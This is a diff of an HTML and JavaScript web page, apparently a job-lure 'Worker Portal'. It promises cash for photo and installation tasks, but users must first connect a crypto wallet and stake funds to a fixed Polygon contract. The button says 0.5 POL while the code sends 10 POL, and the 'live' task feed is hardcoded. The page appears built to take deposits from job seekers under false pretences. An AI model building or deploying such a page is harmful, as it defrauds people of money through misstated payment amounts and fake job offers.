@@ -1,137 +1,219 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Worker Auto Debug</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
+    <meta charset="UTF-8">
+    <title>Worker Portal - Full Integration</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 
-<style>
-body {background:#0b0f14;color:white;font-family:Arial;padding:20px;}
-.card {background:#141a22;padding:20px;border-radius:10px;max-width:600px;margin:auto;}
-button {width:100%;padding:14px;margin-top:10px;border:none;border-radius:8px;font-size:16px;cursor:pointer;}
-.run {background:#00ffae;color:#000;font-weight:bold;}
-.log {margin-top:15px;background:#000;padding:10px;border-radius:6px;height:300px;overflow:auto;font-size:13px;}
-.ok {color:#00ffae;}
-.bad {color:#ff4d4f;}
-.warn {color:#ffaa00;}
-</style>
+    <style>
+        body {margin:0;background:#0b0f14;color:white;font-family:Arial;scroll-behavior: smooth;}
+        .container {max-width:800px;margin:auto;padding:20px;}
+        .card {background:#141a22;padding:20px;margin-top:20px;border-radius:12px;border: 1px solid #252e3a;}
+        
+        /* 按钮与交互样式 */
+        .btn-primary {
+            width:100%; padding:14px; background:#00ffae; border:none; border-radius:10px; 
+            cursor:pointer; color: #0b0f14; font-weight: bold; font-size: 16px; transition: 0.3s;
+        }
+        .btn-primary:hover { background: #00d4ff; box-shadow: 0 0 15px rgba(0,255,174,0.4); }
+        .btn-primary:disabled { background: #444; color: #888; cursor: not-allowed; }
+        
+        .btn-secondary {
+            width:100%; padding:10px; margin-top:10px; background:#1e2630; color:#00d4ff; 
+            border:1px solid #00d4ff; border-radius:8px; cursor:pointer;
+        }
+
+        .task { border-bottom:1px solid #333; padding:10px 0; }
+        .highlight {color:#00ffae;}
+        #portal-section { display: none; margin-top: 40px; border-top: 2px dashed #333; padding-top: 20px; }
+        .status-msg { margin-top: 15px; font-size: 14px; color: #00ffae; font-weight: bold; text-align: center; }
+    </style>
 </head>
 
 <body>
 
+<div class="container">
+    <section id="intro-section">
+        <h1>👷 Earn by Completing Real-World Tasks</h1>
+        <p>No experience needed. No middleman. Paid after verification.</p>
+
+        <div class="card">
+            <h2>💰 What You Can Earn</h2>
+            <p>
+                📸 Take location photos → $10–20<br>
+                📍 Find installation site → $20–50<br>
+                🤝 Talk to landlord → $50–100<br>
+                🔧 Assist installation → $100+
+            </p>
+        </div>
+
+        <div class="card">
+            <h2>📋 Task Types</h2>
+            <p class="highlight">Entry Level</p>
+            <p>✔ Take photos | ✔ Upload videos | ✔ Basic checks</p>
+            <p class="highlight">Advanced</p>
+            <p>✔ Installation support | ✔ Local coordination</p>
+        </div>
+
+        <div class="card">
+            <h2>🔥 Open Tasks (Live Feed)</h2>
+            <div class="task">📍 Jakarta – Take site photos | Reward: $20</div>
+            <div class="task">📍 Mumbai – Find location | Reward: $40</div>
+            <div class="task">📍 Bangkok – Landlord meeting | Reward: $60</div>
+        </div>
+
+        <div class="card">
+<h2>🔥 Start</h2>
+
+
+<<div class="card">
+<h3>Step 1: Connect Wallet</h3>
+<button class="btn-secondary" onclick="connect()">Connect Wallet</button>
+<div id="wallet">Not connected</div>
+<button class="btn-secondary" onclick="switchPolygon()">Switch to Polygon</button>
+</div>
+
 <div class="card">
-<h2>🧪 Auto Debug Tool (Click Once)</h2>
-<button class="run" onclick="runAll()">Run Full Check</button>
-<div id="log" class="log"></div>
+<h3>Step 2: Stake (0.5 POL)</h3>
+<button id="stakeBtn" class="btn-primary" onclick="stake()">Stake & Activate</button>
+<div id="status" class="status"></div>
+</div>
+
+<div class="card">
+<h3>Step 3: Tasks</h3>
+<button class="btn-secondary" onclick="loadTasks()">Load Tasks</button>
+<div id="tasks"></div>
+</div>
+
 </div>
 
 <script>
 
+// ===== CONFIG =====
 const CONTRACT = "0xc93f3483c514a9ba22cdf2240b32734a69bf17a2";
-const USDT = "0xc2132d05d31c914a87c6611c10748aacabda6c62";
+
+const ABI = [
+  "function stakeNative() payable",
+  "function tasks(uint256) view returns(address,uint256,uint256,bool)"
+];
 
 let provider, signer, user;
 
-function log(msg, type=""){
-  const el = document.getElementById("log");
-  el.innerHTML += `<div class="${type}">▶ ${msg}</div>`;
-  el.scrollTop = el.scrollHeight;
-}
-
-// ===== MAIN =====
-async function runAll(){
-
-  document.getElementById("log").innerHTML = "";
-
+// ===== CONNECT =====
+async function connect(){
   try{
-    log("Connecting wallet...");
-
     provider = new ethers.BrowserProvider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     signer = await provider.getSigner();
     user = await signer.getAddress();
 
-    log("Wallet: " + user, "ok");
-
-    // ===== CHECK NETWORK =====
     const chain = await window.ethereum.request({method:'eth_chainId'});
-    log("Chain ID: " + chain);
 
-    if(chain !== "0x89"){
-      log("❌ NOT Polygon → switch network", "bad");
-      return;
-    } else {
-      log("✅ Polygon network OK", "ok");
-    }
-
-    // ===== CHECK CONTRACT =====
-    log("Checking CONTRACT...");
-    const code = await provider.getCode(CONTRACT);
-
-    if(code === "0x"){
-      log("❌ CONTRACT NOT FOUND ❌", "bad");
-      log("👉 Your contract is NOT on this network", "warn");
-      return;
-    } else {
-      log("✅ CONTRACT FOUND", "ok");
-    }
-
-    // ===== CHECK USDT =====
-    log("Checking USDT...");
-    const usdtCode = await provider.getCode(USDT);
-
-    if(usdtCode === "0x"){
-      log("❌ USDT NOT FOUND (wrong address)", "bad");
-      return;
-    } else {
-      log("✅ USDT OK", "ok");
-    }
-
-    // ===== TEST APPROVE =====
-    log("Testing approve...");
-    const token = new ethers.Contract(
-      USDT,
-      ["function approve(address,uint256) returns(bool)"],
-      signer
-    );
-
-    const amount = ethers.parseUnits("1",6);
-
-    const tx1 = await token.approve(CONTRACT, amount);
-    log("Approve TX: " + tx1.hash);
-    await tx1.wait();
-
-    log("✅ APPROVE SUCCESS", "ok");
-
-    // ===== TEST STAKE =====
-    log("Testing stake...");
-    const contract = new ethers.Contract(
-      CONTRACT,
-      ["function stakeFund(uint256 amount)"],
-      signer
-    );
-
-    const tx2 = await contract.stakeFund(amount);
-    log("Stake TX: " + tx2.hash);
-    await tx2.wait();
-
-    log("🎉 ALL SUCCESS — SYSTEM WORKING", "ok");
+    document.getElementById("wallet").innerHTML =
+      `Wallet: ${user.slice(0,6)}...${user.slice(-4)}<br>
+       Network: ${chain==="0x89"?"Polygon ✅":"Wrong ❌"}`;
 
   }catch(e){
-
-    log("❌ ERROR OCCURRED", "bad");
-
-    if(e.message.includes("resolver")){
-      log("👉 ROOT CAUSE: CONTRACT NOT FOUND ON NETWORK", "bad");
-    }
-
-    if(e.message.includes("insufficient")){
-      log("👉 NOT ENOUGH USDT", "warn");
-    }
-
-    log(e.message, "bad");
-    console.error(e);
+    showError(e);
   }
+}
+
+// ===== SWITCH NETWORK =====
+async function switchPolygon(){
+  try{
+    await window.ethereum.request({
+      method:"wallet_switchEthereumChain",
+      params:[{chainId:"0x89"}]
+    });
+    location.reload();
+  }catch{
+    alert("Switch manually in MetaMask");
+  }
+}
+
+// ===== STAKE (POL) =====
+async function stake(){
+
+  const btn = document.getElementById("stakeBtn");
+
+  try{
+    if(!signer) throw new Error("Connect wallet first");
+
+    const chain = await window.ethereum.request({method:'eth_chainId'});
+    if(chain !== "0x89") throw new Error("Switch to Polygon first");
+
+    btn.disabled = true;
+    btn.innerText = "Processing...";
+
+    const contract = new ethers.Contract(CONTRACT, ABI, signer);
+
+    const amount = ethers.parseEther("10.0"); // 🔥 adjustable
+
+    setStatus("Staking POL...");
+
+    const tx = await contract.stakeNative({
+      value: amount
+    });
+
+    setStatus("Waiting confirmation...");
+    await tx.wait();
+
+    setStatus("✅ Activated! Redirecting...", "success");
+
+    setTimeout(()=>{
+      window.location.href = `create-task.html?worker=${user}`;
+    },1200);
+
+  }catch(e){
+    showError(e);
+    btn.disabled = false;
+    btn.innerText = "Retry Stake";
+  }
+}
+
+// ===== LOAD TASKS =====
+async function loadTasks(){
+
+  try{
+    if(!provider) throw new Error("Connect wallet first");
+
+    const contract = new ethers.Contract(CONTRACT, ABI, provider);
+
+    let html="";
+
+    for(let i=0;i<5;i++){
+      try{
+        let t = await contract.tasks(i);
+
+        html += `
+        <div class="card">
+        Task #${i}<br>
+        Reward: ${Number(ethers.formatUnits(t[1],6))}<br>
+        Status: ${t[3]?"✅ Available":"⏳ Pending"}
+        </div>`;
+      }catch{
+        break;
+      }
+    }
+
+    document.getElementById("tasks").innerHTML =
+      html || "No tasks yet";
+
+  }catch(e){
+    showError(e);
+  }
+}
+
+// ===== UI =====
+function setStatus(msg, type=""){
+  const el = document.getElementById("status");
+  el.className = "status " + type;
+  el.innerText = msg;
+}
+
+function showError(e){
+  console.error(e);
+  setStatus("❌ " + (e.reason || e.message), "error");
 }
 
 </script>
